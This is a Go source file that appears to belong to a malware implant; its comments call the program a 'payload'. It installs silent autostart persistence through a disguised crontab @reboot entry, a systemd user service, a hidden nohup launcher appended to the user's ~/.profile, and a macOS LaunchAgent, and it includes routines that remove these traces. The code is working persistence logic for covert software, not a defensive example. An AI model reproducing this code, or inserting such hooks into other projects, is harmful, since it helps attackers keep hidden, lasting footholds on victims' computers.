//go:build !windows

package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

const cronMarker = "# wupsvc"

// installPersistence sets up autostart according to the configured method:
//
//	"auto"/"cron"  - crontab @reboot entry (default)
//	"systemd"      - systemd user service
//	"profile"      - append a guarded launcher to the shell profile
//	"launchagent"  - macOS LaunchAgent (darwin only)
//	"none"         - disabled
//
// Failures are silent by design.
func installPersistence(method, name string) {
	if method == "none" {
		return
	}

	if runtime.GOOS == "darwin" {
		if method == "launchagent" || method == "auto" {
			installLaunchAgent(name)
		}
		return
	}

	switch method {
	case "systemd":
		installSystemdUserService(name)
	case "profile":
		installProfileHook(name)
	default:
		installCron(name)
	}
}

func installCron(name string) {
	exePath, err := os.Executable()
	if err != nil {
		return
	}

	cmd := exec.Command("crontab", "-l")
	cmd.SysProcAttr = getSysProcAttr()
	out, _ := cmd.Output()
	existing := string(out)

	if strings.Contains(existing, cronMarker) {
		return
	}

	entry := "@reboot " + exePath + " " + cronMarker + "\n"
	newCrontab := strings.TrimRight(existing, "\n") + "\n" + entry

	installCmd := exec.Command("crontab", "-")
	installCmd.SysProcAttr = getSysProcAttr()
	installCmd.Stdin = strings.NewReader(newCrontab)
	installCmd.Run()
}

func installSystemdUserService(name string) {
	exePath, err := os.Executable()
	if err != nil {
		return
	}
	home, err := os.UserHomeDir()
	if err != nil {
		return
	}
	unitName := sanitizePersistName(name) + ".service"
	unitDir := filepath.Join(home, ".config", "systemd", "user")
	unitPath := filepath.Join(unitDir, unitName)

	if _, err := os.Stat(unitPath); err == nil {
		return // already installed
	}
	if err := os.MkdirAll(unitDir, 0755); err != nil {
		return
	}

	unit := fmt.Sprintf(`[Unit]
Description=%s

[Service]
Type=simple
ExecStart=%s
Restart=on-failure

[Install]
WantedBy=default.target
`, sanitizePersistName(name), exePath)

	if err := os.WriteFile(unitPath, []byte(unit), 0644); err != nil {
		return
	}

	reload := exec.Command("systemctl", "--user", "daemon-reload")
	reload.SysProcAttr = getSysProcAttr()
	reload.Run()
	enable := exec.Command("systemctl", "--user", "enable", unitName)
	enable.SysProcAttr = getSysProcAttr()
	enable.Run()
}

func installProfileHook(name string) {
	exePath, err := os.Executable()
	if err != nil {
		return
	}
	home, err := os.UserHomeDir()
	if err != nil {
		return
	}
	marker := "# " + sanitizePersistName(name)
	profile := filepath.Join(home, ".profile")

	var existing []byte
	if data, err := os.ReadFile(profile); err == nil {
		if strings.Contains(string(data), marker) {
			return // already installed
		}
		existing = data
	}

	line := fmt.Sprintf("\n%s\n( nohup \"%s\" >/dev/null 2>&1 & )\n", marker, exePath)
	f, err := os.OpenFile(profile, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	if len(existing) > 0 && existing[len(existing)-1] != '\n' {
		f.WriteString("\n")
	}
	f.WriteString(line)
}

func installLaunchAgent(name string) {
	exePath, err := os.Executable()
	if err != nil {
		return
	}
	home, err := os.UserHomeDir()
	if err != nil {
		return
	}
	label := sanitizePersistName(name)
	agentsDir := filepath.Join(home, "Library", "LaunchAgents")
	plistPath := filepath.Join(agentsDir, label+".plist")

	if _, err := os.Stat(plistPath); err == nil {
		return // already installed
	}
	if err := os.MkdirAll(agentsDir, 0755); err != nil {
		return
	}

	plist := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Label</key>
	<string>%s</string>
	<key>ProgramArguments</key>
	<array>
		<string>%s</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>KeepAlive</key>
	<false/>
</dict>
</plist>
`, label, exePath)

	if err := os.WriteFile(plistPath, []byte(plist), 0644); err != nil {
		return
	}

	load := exec.Command("launchctl", "load", plistPath)
	load.SysProcAttr = getSysProcAttr()
	load.Run()
}

// uninstallPersistence removes every artifact this payload could have
// installed. All artifact names derive from the per-payload unique persist
// name, so attempting each method is harmless when it was never used.
// Failures are silent by design.
func uninstallPersistence(method, name string) {
	label := sanitizePersistName(name)
	exePath, err := os.Executable()
	if err != nil {
		exePath = ""
	}
	uninstallCron(exePath)
	uninstallSystemdUserService(label)
	uninstallProfileHook(label, exePath)
	uninstallLaunchAgent(label)
	_ = method
}

func uninstallCron(exePath string) {
	if exePath == "" {
		return
	}
	cmd := exec.Command("crontab", "-l")
	cmd.SysProcAttr = getSysProcAttr()
	out, err := cmd.Output()
	if err != nil && len(out) == 0 {
		return
	}
	var kept []string
	changed := false
	for _, line := range strings.Split(string(out), "\n") {
		if strings.Contains(line, cronMarker) || strings.Contains(line, exePath) {
			changed = true
			continue
		}
		kept = append(kept, line)
	}
	if !changed {
		return
	}
	install := exec.Command("crontab", "-")
	install.SysProcAttr = getSysProcAttr()
	install.Stdin = strings.NewReader(strings.TrimRight(strings.Join(kept, "\n"), "\n") + "\n")
	install.Run()
}

func uninstallSystemdUserService(label string) {
	unitName := label + ".service"
	home, err := os.UserHomeDir()
	if err != nil {
		return
	}
	unitPath := filepath.Join(home, ".config", "systemd", "user", unitName)
	if _, err := os.Stat(unitPath); err != nil {
		return // not installed
	}
	disable := exec.Command("systemctl", "--user", "disable", "--now", unitName)
	disable.SysProcAttr = getSysProcAttr()
	disable.Run()
	os.Remove(unitPath)
	reload := exec.Command("systemctl", "--user", "daemon-reload")
	reload.SysProcAttr = getSysProcAttr()
	reload.Run()
}

func uninstallProfileHook(label, exePath string) {
	home, err := os.UserHomeDir()
	if err != nil {
		return
	}
	profile := filepath.Join(home, ".profile")
	data, err := os.ReadFile(profile)
	if err != nil {
		return
	}
	lines := strings.Split(string(data), "\n")
	var kept []string
	changed := false
	for i := 0; i < len(lines); i++ {
		line := lines[i]
		// The installer appends the marker line followed by the launcher
		// line; drop both together.
		if strings.TrimSpace(line) == "# "+label {
			if i+1 < len(lines) && strings.HasPrefix(strings.TrimSpace(lines[i+1]), "( nohup ") {
				i++
			}
			changed = true
			continue
		}
		if exePath != "" && strings.Contains(line, exePath) {
			changed = true
			continue
		}
		kept = append(kept, line)
	}
	if !changed {
		return
	}
	os.WriteFile(profile, []byte(strings.TrimRight(strings.Join(kept, "\n"), "\n")+"\n"), 0644)
}

func uninstallLaunchAgent(label string) {
	home, err := os.UserHomeDir()
	if err != nil {
		return
	}
	plistPath := filepath.Join(home, "Library", "LaunchAgents", label+".plist")
	if _, err := os.Stat(plistPath); err != nil {
		return // not installed
	}
	unload := exec.Command("launchctl", "unload", plistPath)
	unload.SysProcAttr = getSysProcAttr()
	unload.Run()
	os.Remove(plistPath)
}
